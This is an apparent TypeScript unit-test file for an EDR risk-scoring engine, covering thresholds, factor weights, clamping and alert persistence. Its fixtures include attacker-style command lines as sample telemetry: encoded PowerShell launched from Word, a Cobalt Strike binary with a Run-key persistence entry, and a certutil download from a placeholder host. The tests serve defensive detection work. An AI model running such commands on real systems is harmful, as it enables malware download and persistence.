import { initDatabase, query } from '../backend/db/index.js';
import { 
  calculateTransparentRiskScore, 
  getRiskLevel, 
  getScoringConfig, 
  updateScoringConfig, 
  resetScoringConfig, 
  FACTOR_DEFINITIONS,
  DEFAULT_RISK_SCORING_CONFIG
} from '../backend/scoring/index.js';
import { ingestAndDetect, getAlerts, getAlertById } from '../backend/detection/index.js';

function assert(condition: boolean, message: string) {
  if (!condition) {
    console.error(`  \x1b[31m✖\x1b[0m ${message}`);
    throw new Error(`Assertion failed: ${message}`);
  }
  console.log(`  \x1b[32m✔\x1b[0m ${message}`);
}

async function runRiskScoringTests() {
  console.log('\x1b[1m=== Running Transparent Risk-Scoring Engine Unit Tests ===\x1b[0m');

  await initDatabase();

  // Reset to default config before testing
  resetScoringConfig();

  // -------------------------------------------------------------
  // Test Suite 1: Risk Level Threshold Mapping
  // -------------------------------------------------------------
  console.log('\n\x1b[36m[Test Suite 1: Risk Level Threshold Mapping (0-19, 20-39, 40-59, 60-79, 80-100)]\x1b[0m');
  assert(getRiskLevel(0) === 'Informational', 'Score 0 maps to Informational');
  assert(getRiskLevel(10) === 'Informational', 'Score 10 maps to Informational');
  assert(getRiskLevel(19) === 'Informational', 'Score 19 maps to Informational');

  assert(getRiskLevel(20) === 'Low', 'Score 20 maps to Low');
  assert(getRiskLevel(30) === 'Low', 'Score 30 maps to Low');
  assert(getRiskLevel(39) === 'Low', 'Score 39 maps to Low');

  assert(getRiskLevel(40) === 'Medium', 'Score 40 maps to Medium');
  assert(getRiskLevel(50) === 'Medium', 'Score 50 maps to Medium');
  assert(getRiskLevel(59) === 'Medium', 'Score 59 maps to Medium');

  assert(getRiskLevel(60) === 'High', 'Score 60 maps to High');
  assert(getRiskLevel(70) === 'High', 'Score 70 maps to High');
  assert(getRiskLevel(79) === 'High', 'Score 79 maps to High');

  assert(getRiskLevel(80) === 'Critical', 'Score 80 maps to Critical');
  assert(getRiskLevel(90) === 'Critical', 'Score 90 maps to Critical');
  assert(getRiskLevel(100) === 'Critical', 'Score 100 maps to Critical');

  // -------------------------------------------------------------
  // Test Suite 2: Default Scoring Factor Weights Specification
  // -------------------------------------------------------------
  console.log('\n\x1b[36m[Test Suite 2: Default Scoring Factor Weights Specification]\x1b[0m');
  const config = getScoringConfig();
  assert(config.factors.suspicious_parent_child === 15, 'Suspicious parent-child relationship: +15');
  assert(config.factors.suspicious_command_line === 20, 'Suspicious command line: +20');
  assert(config.factors.unsigned_executable === 10, 'Unsigned executable: +10');
  assert(config.factors.known_malicious_hash === 50, 'Known malicious hash: +50');
  assert(config.factors.suspicious_temporary_execution === 15, 'Suspicious temporary execution: +15');
  assert(config.factors.persistence_activity === 30, 'Persistence activity: +30');
  assert(config.factors.threat_intel_match === 40, 'Threat intelligence match: +40');
  assert(config.factors.mitre_technique_detection === 15, 'MITRE technique detection: +15');
  assert(config.base_score === 0, 'Default base score is 0');

  // -------------------------------------------------------------
  // Test Suite 3: Transparent Calculation Breakdown (Do Not Hide Calculation!)
  // -------------------------------------------------------------
  console.log('\n\x1b[36m[Test Suite 3: Transparent Score Calculation & Completeness]\x1b[0m');

  const calc1 = calculateTransparentRiskScore({
    event: {
      event_type: 'process_creation',
      process_name: 'powershell.exe',
      parent_process_name: 'winword.exe',
      command_line: 'powershell.exe -enc V3JpdGU='
    },
    rule: {
      id: 'EDR-001-OFFICE-POWERSHELL',
      name: 'PowerShell Spawned by Office',
      description: 'Office macro execution',
      severity: 'CRITICAL',
      score: 90,
      enabled: true,
      mitre: {
        tactic: 'Execution',
        technique_id: 'T1059.001',
        technique_name: 'PowerShell'
      },
      conditions: {
        parent_process: 'winword.exe',
        command_line: '-enc'
      },
      recommended_action: 'Quarantine Office doc'
    },
    evalResult: {
      matched: true,
      reason: 'Parent winword.exe AND command line -enc',
      evidence: {
        parent_process: 'winword.exe',
        command_line: '-enc',
        matched_criteria: ['Parent is winword.exe', 'Command line contains -enc']
      }
    }
  });

  // Check that all 4 required fields exist: Base score, Individual score factors, Final score, Risk level
  assert(typeof calc1.base_score === 'number', 'Calculation shows Base score');
  assert(Array.isArray(calc1.factors) && calc1.factors.length > 0, 'Calculation shows Individual score factors');
  assert(typeof calc1.final_score === 'number', 'Calculation shows Final score');
  assert(['Informational', 'Low', 'Medium', 'High', 'Critical'].includes(calc1.risk_level), 'Calculation shows Risk level');

  // Verify contributing factors:
  // suspicious_parent_child (+15) + suspicious_command_line (+20) + mitre_technique_detection (+15) = 50 [Medium]
  const factorKeys1 = calc1.factors.map(f => f.factor);
  assert(factorKeys1.includes('suspicious_parent_child'), 'Includes suspicious_parent_child (+15)');
  assert(factorKeys1.includes('suspicious_command_line'), 'Includes suspicious_command_line (+20)');
  assert(factorKeys1.includes('mitre_technique_detection'), 'Includes mitre_technique_detection (+15)');
  assert(calc1.raw_score === 50, 'Raw sum is 0 + 15 + 20 + 15 = 50');
  assert(calc1.final_score === 50, 'Final score is 50');
  assert(calc1.risk_level === 'Medium', 'Risk level is Medium (40-59)');
  assert(calc1.breakdown.includes('Base: 0') && calc1.breakdown.includes('+15') && calc1.breakdown.includes('+20'), 'Formula breakdown shows complete arithmetic');

  // -------------------------------------------------------------
  // Test Suite 4: Score Clamping (Prevent Exceeding 100)
  // -------------------------------------------------------------
  console.log('\n\x1b[36m[Test Suite 4: Clamping Score to Prevent Exceeding 100]\x1b[0m');

  // Multiple compounding high-severity factors:
  // known_malicious_hash (+50) + threat_intel_match (+40) + persistence_activity (+30) + mitre_technique_detection (+15)
  // Sum = 50 + 40 + 30 + 15 = 135 -> MUST CLAMP TO 100!
  const calcOverflow = calculateTransparentRiskScore({
    event: {
      event_type: 'process_creation',
      process_name: 'cobaltstrike.exe',
      parent_process_name: 'services.exe',
      image_path: 'C:\\Windows\\Temp\\cobaltstrike.exe',
      file_hash: '3a41b52f9c9b1395f5dc431a4773de90c2975850ab89e0ee25be326c9533f86e',
      signature_status: 'Unsigned',
      command_line: 'cobaltstrike.exe -enc AAAA /run',
      registry_key: 'HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Payload'
    },
    rule: {
      id: 'EDR-TEST-EXTREME-MALWARE',
      name: 'Extreme Threat Multi-Factor Payload',
      description: 'Severe multi-vector malware execution',
      severity: 'CRITICAL',
      score: 100,
      enabled: true,
      mitre: {
        tactic: 'Persistence',
        technique_id: 'T1547.001',
        technique_name: 'Registry Run Keys'
      },
      conditions: {},
      recommended_action: 'Isolate host immediately'
    },
    threatIntelMatched: true,
    evalResult: {
      matched: true,
      reason: 'Matched multiple criteria',
      evidence: {
        hash: 'cobalt strike sample [Threat Intel]',
        matched_criteria: ['IoC hash match', 'Temp execution']
      }
    }
  });

  assert(calcOverflow.raw_score > 100, `Raw score exceeds 100 (raw_score: ${calcOverflow.raw_score})`);
  assert(calcOverflow.final_score === 100, `Score is clamped at exactly 100 (final_score: ${calcOverflow.final_score})`);
  assert(calcOverflow.is_clamped === true, 'Calculation flag is_clamped is true');
  assert(calcOverflow.risk_level === 'Critical', 'Clamped score of 100 evaluates to Critical risk');
  assert(calcOverflow.breakdown.includes('Clamped to 100'), 'Breakdown formula explicitly notes score clamping');

  // -------------------------------------------------------------
  // Test Suite 5: Configurable Scores & Dynamic Weights
  // -------------------------------------------------------------
  console.log('\n\x1b[36m[Test Suite 5: Configurable Risk Scores & Custom Weights]\x1b[0m');

  // Change suspicious_command_line to +35 and base_score to +10
  const updatedConfig = updateScoringConfig({
    base_score: 10,
    factors: {
      suspicious_command_line: 35
    }
  });
  assert(updatedConfig.base_score === 10, 'Updated base_score to 10');
  assert(updatedConfig.factors.suspicious_command_line === 35, 'Updated suspicious_command_line weight to 35');

  const calcCustom = calculateTransparentRiskScore({
    event: {
      event_type: 'process_creation',
      process_name: 'certutil.exe',
      command_line: 'certutil.exe -urlcache -split http://test/file.exe'
    },
    rule: {
      id: 'EDR-004-SUSPICIOUS-LOLBIN-EXEC',
      name: 'Suspicious LOLBin',
      description: 'Certutil abuse',
      severity: 'HIGH',
      score: 85,
      enabled: true,
      mitre: {
        tactic: 'Defense Evasion',
        technique_id: 'T1218',
        technique_name: 'System Binary Proxy Execution'
      },
      conditions: {},
      recommended_action: 'Block URL'
    }
  });

  // Base 10 + suspicious_command_line (35) + mitre_technique_detection (15) = 60 [High]
  assert(calcCustom.base_score === 10, 'Custom calculation honors updated base_score of 10');
  const cmdFactor = calcCustom.factors.find(f => f.factor === 'suspicious_command_line');
  assert(cmdFactor !== undefined && cmdFactor.points === 35, 'Custom calculation honors updated factor weight of +35');
  assert(calcCustom.final_score === 60, 'Custom final score is 10 + 35 + 15 = 60');
  assert(calcCustom.risk_level === 'High', 'Score 60 evaluates to High risk');

  // Reset back to factory defaults
  const resetConfig = resetScoringConfig();
  assert(resetConfig.base_score === 0, 'Reset restored base_score to 0');
  assert(resetConfig.factors.suspicious_command_line === 20, 'Reset restored suspicious_command_line to 20');

  // -------------------------------------------------------------
  // Test Suite 6: Alert Generation & SQLite Persistence of Score Factors
  // -------------------------------------------------------------
  console.log('\n\x1b[36m[Test Suite 6: Alert Generation & SQLite Transparent Scoring Fields]\x1b[0m');

  const testEvent = {
    event_type: 'process_creation' as const,
    process_name: 'powershell.exe',
    parent_process_name: 'winword.exe',
    parent_process_id: 8820,
    command_line: 'powershell.exe -ExecutionPolicy Bypass -enc V3JpdGUtSG9zdA==',
    user: 'CORP\\Accountant',
    image_path: 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe'
  };

  const ingestRes = ingestAndDetect(testEvent);
  assert(ingestRes.alertsGenerated.length > 0, 'Ingested event generated alert');

  const generatedAlert = ingestRes.alertsGenerated.find(a => a.rule_id === 'EDR-001-OFFICE-POWERSHELL');
  assert(generatedAlert !== undefined, 'Found Office PowerShell alert');

  if (generatedAlert) {
    // Check alert record fields
    assert(typeof generatedAlert.base_score === 'number', 'Alert record has base_score');
    assert(typeof generatedAlert.score === 'number', 'Alert record has final score');
    assert(generatedAlert.score <= 100, 'Alert score does not exceed 100');
    assert(typeof generatedAlert.risk_level === 'string', `Alert record has risk_level (${generatedAlert.risk_level})`);
    assert(typeof generatedAlert.score_factors_json === 'string', 'Alert record has score_factors_json');
    assert(typeof generatedAlert.score_calculation_json === 'string', 'Alert record has score_calculation_json');

    // Parse score factors
    const factorsFromAlert = JSON.parse(generatedAlert.score_factors_json!);
    assert(Array.isArray(factorsFromAlert) && factorsFromAlert.length >= 2, 'Alert has parsed individual score factors');
    assert(factorsFromAlert.some((f: any) => f.factor === 'suspicious_parent_child'), 'Alert has suspicious_parent_child factor (+15)');
    assert(factorsFromAlert.some((f: any) => f.factor === 'suspicious_command_line'), 'Alert has suspicious_command_line factor (+20)');

    // Parse full calculation
    const calcFromAlert = JSON.parse(generatedAlert.score_calculation_json!);
    assert(calcFromAlert.base_score === generatedAlert.base_score, 'Calculation base score matches alert base score');
    assert(calcFromAlert.final_score === generatedAlert.score, 'Calculation final score matches alert score');
    assert(calcFromAlert.risk_level === generatedAlert.risk_level, 'Calculation risk level matches alert risk level');
    assert(calcFromAlert.breakdown.length > 0, 'Calculation includes transparent breakdown');

    // Verify SQLite persistence by querying back from database
    const dbAlerts = getAlerts({ rule_id: 'EDR-001-OFFICE-POWERSHELL' });
    assert(dbAlerts.length > 0, 'Query returned alerts from SQLite');
    const persisted = dbAlerts[0];
    assert(persisted.score === generatedAlert.score, 'Persisted alert score matches in SQLite');
    assert(persisted.risk_level === generatedAlert.risk_level, 'Persisted alert risk_level matches in SQLite');

    const singleLookup = getAlertById(generatedAlert.id);
    assert(singleLookup !== null, 'Retrieved single alert by ID from SQLite');
    assert(singleLookup?.alert.base_score === generatedAlert.base_score, 'Lookup retains base_score');
  }

  console.log('\n\x1b[1;32m✔ All Transparent Risk-Scoring Engine Unit Tests Passed Successfully!\x1b[0m\n');
}

runRiskScoringTests().catch(err => {
  console.error('\n\x1b[1;31m✖ Risk Scoring Engine Unit Tests Failed:\x1b[0m', err);
  process.exit(1);
});
